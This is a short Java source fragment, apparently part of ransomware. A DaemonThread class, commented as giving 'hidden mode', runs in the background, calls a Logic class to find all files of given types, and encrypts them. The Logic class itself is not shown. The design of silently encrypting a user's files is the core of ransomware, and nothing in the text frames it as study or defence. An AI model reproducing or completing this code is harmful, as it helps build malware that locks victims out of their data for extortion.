// Use DaemonThread to provide hidden mode

class DaemonThread implements Runnable {

    @Override
    public void run() {
        try {
            encryptAndDecryptSession();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void encryptAndDecryptSession() throws Exception {
        Logic logic = new Logic();
        logic.searchAllFilesOfGivenTypes();
        logic.encryptAllFilesOfGivenType();
    }
}
